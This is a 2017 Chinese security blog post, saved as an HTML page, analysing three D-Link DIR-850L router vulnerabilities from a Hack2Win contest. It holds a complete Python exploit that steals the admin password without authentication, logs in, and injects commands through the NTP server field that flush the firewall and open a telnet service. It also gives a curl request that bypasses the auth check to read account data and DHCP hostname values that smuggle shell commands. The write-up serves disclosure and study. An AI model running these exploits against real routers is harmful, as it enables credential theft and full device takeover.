@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+            <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="">
+        <meta name="author" content="">
+
+        <title>JenI's Blog</title>
+
+        <link rel="icon" href="https://blog.jenisec.org/theme/images/favicon.ico" type="image/x-icon">  
+        <link rel="shortcut icon" href="https://blog.jenisec.org/theme/images/favicon.ico" type="image/x-icon">  
+
+
+        <link href="https://blog.jenisec.org/theme/css/iconfont.css" rel="stylesheet">
+
+        <!-- Bootstrap Core CSS -->
+        <link href="https://blog.jenisec.org/theme/css/bootstrap.min.css" rel="stylesheet">
+
+        <!-- Custom CSS -->
+        <link href="https://blog.jenisec.org/theme/css/clean-blog.min.css" rel="stylesheet">
+
+        <!-- Code highlight color scheme -->
+            <link href="https://blog.jenisec.org/theme/css/code_blocks/monokai.css" rel="stylesheet">
+
+        <!-- Custom Fonts -->
+        <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+        <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+        <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+        <!--[if lt IE 9]>
+            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+
+
+
+        <meta name="tags" contents="路由器" />
+
+
+			<meta property="og:locale" content="zh">
+		<meta property="og:site_name" content="JenI's Blog">
+
+	<meta property="og:type" content="article">
+	<meta property="article:author" content="">
+	<meta property="og:url" content="https://blog.jenisec.org/security/dlinkRce.html">
+	<meta property="og:title" content="D-Link DIR 系列路由器信息泄露与远程命令执行漏洞">
+	<meta property="og:description" content="">
+	<meta property="og:image" content="https://blog.jenisec.org/../theme/images/posts/dlink/dlinkRce-cover.png">
+	<meta property="article:published_time" content="2017-08-10 00:00:00+08:00">
+</head>
+
+<body style="background-color: #f8f8f8">
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+        <div class="container-fluid">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="https://blog.jenisec.org/">JenI's Blog</a>
+            </div>
+
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                <ul class="nav navbar-nav navbar-right">
+                        <li><a href="https://blog.jenisec.org/category/an-quan.html">安全</a></li>
+                        <li><a href="https://blog.jenisec.org/category/xi-tong.html">系统</a></li>
+                        <li><a href="https://blog.jenisec.org/category/ri-chang.html">日常</a></li>
+
+                </ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+    <!-- Page Header -->
+        <header class="intro-header" style="background-image: url('../theme/images/posts/dlink/dlinkRce-cover.png')">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <div class="post-heading">
+                        <h1>D-Link DIR 系列路由器信息泄露与远程命令执行漏洞</h1>
+                        <span class="meta">Posted by
+                                <a href="https://blog.jenisec.org/author/jeni.html">JenI</a>
+                             on 2017-08-10 00:00:00+08:00
+                        </span>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1" style="background-color: #f8f8f8;position: relative;">
+    <!-- Post Content -->
+    <article style="background-color: #f8f8f8;position: relative;">
+        <p><strong><em>前言</em></strong></p>
+<p>D-Link(友讯网络)是一家生产网络硬件和软件产品的企业，主要产品有交换机、无线产品、宽带产品、网卡、路由器、网络摄像机和网络安全产品(防火墙)等。</p>
+<p>今年六月，网上举办了一场针对 D-Link 路由器的 Hack2Win 黑客竞赛，举办方在公网上提供 D-Link 850L 路由器作为攻击目标，竞赛持续了两个月，最终确定了3个漏洞：</p>
+<ul>
+<li>Remote Command Execution via WAN and LAN</li>
+<li>Remote Unauthenticated Information Disclosure via WAN and LAN</li>
+<li>Unauthorized Remote Code Execution as root via LAN</li>
+</ul>
+<p>下面是对漏洞的简要分析</p>
+<p><strong><em>漏洞一</em></strong></p>
+<p>正常情况下，当用户在D-Link路由器中修改设置时，设置将会以XML格式发送到hedwig.cgi，hedwig.cgi接收到XML格式的设置请求后，调用fatlady.php用于对设置进行验证，然后再对pigwidgeon.cgi进行请求，pigwidgeon.cgi用来应用新设置，如果新的设置是有效的，则对设置的服务进行重启。
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/dlink/dlinkRce-1.png" alt="dlinkRce-1" /></div></p>
+<p>fatlady.php 文件内的 $service 变量直接从接收到的 XML 中获取，所以通过控制请求 XML 中的 service 就可以加载任何带有 .php 拓展的文件，比如，控制 $target 变量指向 /htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml.php 文件即可读取用户的用户名密码。</p>
+<p>由于 $target 变量会在 $service 前后拼接路径和后缀，所以在上传 XML 数据时需要将 service 指向的文件路径前加上 ../../../，最终传入路由器的XML如下：
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/dlink/dlinkRce-2.png" alt="dlinkRce-2" /></div></p>
+<p>hedwig.cgi 在接收 XML 数据时未进行身份验证，所以无需认证便可以请求 hedwig.cgi 和 pigwidgeon.cgi。</p>
+<p>将 XML 数据发送到 hedwig.cgi，设置请求中的 Content-Type 为 text/xml，成功获取路由器的管理用户名密码，如下图所示：
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/dlink/dlinkRce-3.png" alt="dlinkRce-3" /></div></p>
+<p>得到用户名密码后成功登陆，如下图：
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/dlink/dlinkRce-4.png" alt="dlinkRce-4" /></div></p>
+<p>登陆到管理页面以后，可以通过 NTP 服务器进行 shell 命令注入
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/dlink/dlinkRce-5.png" alt="dlinkRce-5" /></div></p>
+<p>根据代码得知，要成功注入命令，需要设置 $enable 和 $enablev6 为 1，所以 XML 内容如下：
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/dlink/dlinkRce-6.png" alt="dlinkRce-6" /></div></p>
+<p>设置 $enable 和 $enablev6 为 1，在 server 中设置要执行的命令：配置防火墙并在 12345 端口启动一个 telnetd 服务。构造好 XML后 POST 到 hedwig.cgi，成功后返回结果会显示 OK，如下图所示：
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/dlink/dlinkRce-7.png" alt="dlinkRce-7" /></div></p>
+<p>此时通过 telnet 探测目标路由器的 12345 端口是关闭状态。
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/dlink/dlinkRce-8.png" alt="dlinkRce-8" /></div></p>
+<p>通过 pigwidgeon.cgi 使设置生效，设置生效的同时命令也被执行了。
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/dlink/dlinkRce-9.png" alt="dlinkRce-9" /></div></p>
+<p>再使用 telnet 探测目标端口，发现目标端口成功开放。
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/dlink/dlinkRce-10.png" alt="dlinkRce-10" /></div></p>
+<p><strong><em>漏洞POC(Python3)</em></strong></p>
+<div class="highlight"><pre><span></span><span class="c1"># pylint: disable=C0103</span>
+<span class="c1">#</span>
+<span class="c1"># pip3 install requests lxml</span>
+<span class="c1">#</span>
+<span class="kn">import</span> <span class="nn">hmac</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urljoin</span>
+<span class="kn">from</span> <span class="nn">xml.sax.saxutils</span> <span class="kn">import</span> <span class="n">escape</span>
+<span class="kn">import</span> <span class="nn">lxml.etree</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="k">pass</span>
+
+<span class="n">TARGET</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">COMMAND</span> <span class="o">=</span> <span class="s2">&quot;;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>
+    <span class="s2">&quot;iptables -F&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;iptables -X&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;iptables -t nat -F&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;iptables -t nat -X&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;iptables -t mangle -F&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;iptables -t mangle -X&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;iptables -P INPUT ACCEPT&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;iptables -P FORWARD ACCEPT&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;iptables -P OUTPUT ACCEPT&quot;</span><span class="p">,</span>
+    <span class="s2">&quot;telnetd -p 23090 -l /bin/date&quot;</span>  <span class="c1"># port &#39;Z2&#39;</span>
+    <span class="p">])</span>
+
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="n">session</span><span class="o">.</span><span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span>
+
+<span class="c1">############################################################</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s2">&quot;Get password...&quot;</span><span class="p">)</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;text/xml&quot;</span><span class="p">}</span>
+<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;uid&quot;</span><span class="p">:</span> <span class="s2">&quot;whatever&quot;</span><span class="p">}</span>
+<span class="n">data</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
+<span class="s2">&lt;postxml&gt;</span>
+<span class="s2">&lt;module&gt;</span>
+<span class="s2">    &lt;service&gt;../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml&lt;/service&gt;</span>
+<span class="s2">&lt;/module&gt;</span>
+<span class="s2">&lt;/postxml&gt;&quot;&quot;&quot;</span>
+
+<span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">&quot;/hedwig.cgi&quot;</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+<span class="c1"># print(resp.text)</span>
+
+<span class="c1"># getcfg: &lt;module&gt;...&lt;/module&gt;</span>
+<span class="c1"># hedwig: &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
+<span class="c1">#       : &lt;hedwig&gt;...&lt;/hedwig&gt;</span>
+<span class="n">accdata</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">[:</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;&lt;?xml&quot;</span><span class="p">)]</span>
+
+<span class="n">admin_pasw</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+
+<span class="n">tree</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">etree</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">accdata</span><span class="p">)</span>
+<span class="n">accounts</span> <span class="o">=</span> <span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">&quot;/module/device/account/entry&quot;</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">acc</span> <span class="ow">in</span> <span class="n">accounts</span><span class="p">:</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="n">acc</span><span class="o">.</span><span class="n">findtext</span><span class="p">(</span><span class="s2">&quot;name&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+    <span class="n">pasw</span> <span class="o">=</span> <span class="n">acc</span><span class="o">.</span><span class="n">findtext</span><span class="p">(</span><span class="s2">&quot;password&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;name:&quot;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;pass:&quot;</span><span class="p">,</span> <span class="n">pasw</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">name</span> <span class="o">==</span> <span class="s2">&quot;Admin&quot;</span><span class="p">:</span>
+        <span class="n">admin_pasw</span> <span class="o">=</span> <span class="n">pasw</span>
+
+<span class="k">if</span> <span class="ow">not</span> <span class="n">admin_pasw</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Admin password not found!&quot;</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+
+<span class="c1">############################################################</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s2">&quot;Auth challenge...&quot;</span><span class="p">)</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">&quot;/authentication.cgi&quot;</span><span class="p">))</span>
+<span class="c1"># print(resp.text)</span>
+
+<span class="n">resp</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&quot;status&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">!=</span> <span class="s2">&quot;ok&quot;</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Failed!&quot;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s2">&quot;uid:&quot;</span><span class="p">,</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&quot;uid&quot;</span><span class="p">])</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">&quot;challenge:&quot;</span><span class="p">,</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&quot;challenge&quot;</span><span class="p">])</span>
+
+<span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s2">&quot;uid&quot;</span><span class="p">:</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&quot;uid&quot;</span><span class="p">]})</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s2">&quot;Auth login...&quot;</span><span class="p">)</span>
+<span class="n">user_name</span> <span class="o">=</span> <span class="s2">&quot;Admin&quot;</span>
+<span class="n">user_pasw</span> <span class="o">=</span> <span class="n">admin_pasw</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&quot;id&quot;</span><span class="p">:</span> <span class="n">user_name</span><span class="p">,</span>
+    <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">user_pasw</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="p">(</span><span class="n">user_name</span> <span class="o">+</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&quot;challenge&quot;</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="s2">&quot;md5&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
+<span class="p">}</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">&quot;/authentication.cgi&quot;</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+<span class="c1"># print(resp.text)</span>
+
+<span class="n">resp</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">resp</span><span class="p">[</span><span class="s2">&quot;status&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">!=</span> <span class="s2">&quot;ok&quot;</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Failed!&quot;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">&quot;OK&quot;</span><span class="p">)</span>
+
+<span class="c1">############################################################</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;SERVICES&quot;</span><span class="p">:</span> <span class="s2">&quot;DEVICE.TIME&quot;</span><span class="p">}</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">&quot;/getcfg.php&quot;</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+<span class="c1"># print(resp.text)</span>
+
+<span class="n">tree</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">etree</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+<span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">&quot;//ntp/enable&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="s2">&quot;1&quot;</span>
+<span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">&quot;//ntp/server&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="s2">&quot;metelesku; (&quot;</span> <span class="o">+</span> <span class="n">COMMAND</span> <span class="o">+</span> <span class="s2">&quot;) &amp; exit; &quot;</span>
+<span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">&quot;//ntp6/enable&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="s2">&quot;1&quot;</span>
+
+<span class="c1">############################################################</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s2">&quot;hedwig&quot;</span><span class="p">)</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;text/xml&quot;</span><span class="p">}</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">etree</span><span class="o">.</span><span class="n">tostring</span><span class="p">(</span><span class="n">tree</span><span class="p">)</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">&quot;/hedwig.cgi&quot;</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+<span class="c1"># print(resp.text)</span>
+
+<span class="n">tree</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">etree</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">tree</span><span class="o">.</span><span class="n">findtext</span><span class="p">(</span><span class="s2">&quot;result&quot;</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">!=</span> <span class="s2">&quot;ok&quot;</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Failed!&quot;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">&quot;OK&quot;</span><span class="p">)</span>
+
+<span class="c1">############################################################</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s2">&quot;pigwidgeon&quot;</span><span class="p">)</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;ACTIONS&quot;</span><span class="p">:</span> <span class="s2">&quot;SETCFG,ACTIVATE&quot;</span><span class="p">}</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">&quot;/pigwidgeon.cgi&quot;</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+<span class="c1"># print(resp.text)</span>
+
+<span class="n">tree</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">etree</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">tree</span><span class="o">.</span><span class="n">findtext</span><span class="p">(</span><span class="s2">&quot;result&quot;</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">!=</span> <span class="s2">&quot;ok&quot;</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Failed!&quot;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">&quot;OK&quot;</span><span class="p">)</span>
+</pre></div>
+
+
+<p><strong><em>漏洞二</em></strong></p>
+<p>D-Link 还存在任意文件读取漏洞。通过设置 $AUTHORIZED_GROUP 全局变量可以绕过安全检查，读取文件。
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/dlink/dlinkRce-11.png" alt="dlinkRce-11" /></div></p>
+<p><strong><em>漏洞POC</em></strong></p>
+<div class="highlight"><pre><span></span>$ curl -d <span class="s2">&quot;SERVICES=DEVICE.ACCOUNT&amp;x=y%0aAUTHORIZED_GROUP=1&quot;</span> <span class="s2">&quot;http://IP/getcfg.php&quot;</span>
+</pre></div>
+
+
+<p><strong><em>漏洞三</em></strong></p>
+<p>这个漏洞由于需要内网环境，我没有相关的设备，所以这个漏洞并没有进行复现，这里只做简单说明。</p>
+<p>受影响的 D-Link 路由器会以 root 用户身份运行 dnsmasq 守护进程，守护进程在为客户端分配 IP 时，会加载 "host-name" 参数，如果主机名被设置为命令，则会被执行。</p>
+<p>攻击者需要更改自己 DHCP 客户端的主机名，以 Linux 为例，编辑 /etc/dhcp/dhclient.conf ，将主机名字段更该为要执行的命令。</p>
+<p>下面的 DHCP 请求会在路由器上执行 ping 命令</p>
+<div class="highlight"><pre><span></span>send host-name = &quot;;ping 192.168.0.100&quot;;
+</pre></div>
+
+
+<p>命令执行过程可以通过使用 WireShark 等嗅探工具查看。</p>
+<p>下面的请求可以获取服务器部分信息</p>
+<div class="highlight"><pre><span></span>send host-name = &quot;;for i in `ls /`; do ping $i;done&quot;;
+</pre></div>
+
+
+<p>此时嗅探网络数据包会得到如下内容：</p>
+<div class="highlight"><pre><span></span><span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">42.963917</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">:</span> <span class="n">ICMP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">udp</span> <span class="n">port</span> <span class="mi">53</span> <span class="n">unreachable</span><span class="o">,</span> <span class="n">length</span> <span class="mi">36</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.955685</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">.</span><span class="mi">37895</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">53</span><span class="o">:</span> <span class="mi">2</span><span class="o">+</span> <span class="n">AAAA</span><span class="o">?</span> <span class="n">www</span><span class="o">.</span> <span class="o">(</span><span class="mi">21</span><span class="o">)</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.955754</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">:</span> <span class="n">ICMP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">udp</span> <span class="n">port</span> <span class="mi">53</span> <span class="n">unreachable</span><span class="o">,</span> <span class="n">length</span> <span class="mi">36</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.956251</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">.</span><span class="mi">51733</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">53</span><span class="o">:</span> <span class="mi">3</span><span class="o">+</span> <span class="n">AAAA</span><span class="o">?</span> <span class="n">www</span><span class="o">.</span> <span class="o">(</span><span class="mi">21</span><span class="o">)</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.956282</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">:</span> <span class="n">ICMP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">udp</span> <span class="n">port</span> <span class="mi">53</span> <span class="n">unreachable</span><span class="o">,</span> <span class="n">length</span> <span class="mi">36</span>
+<span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mf">44.956797</span> <span class="n">IP</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.100</span><span class="o">.</span><span class="mi">52958</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span><span class="o">.</span><span class="mi">53</span><span class="o">:</span> <span class="mi">4</span><span class="o">+</span> <span class="n">AAAA</span><span class="o">?</span> <span class="n">www</span><span class="o">.</span> <span class="o">(</span><span class="mi">21</span><span class="o">)</span>
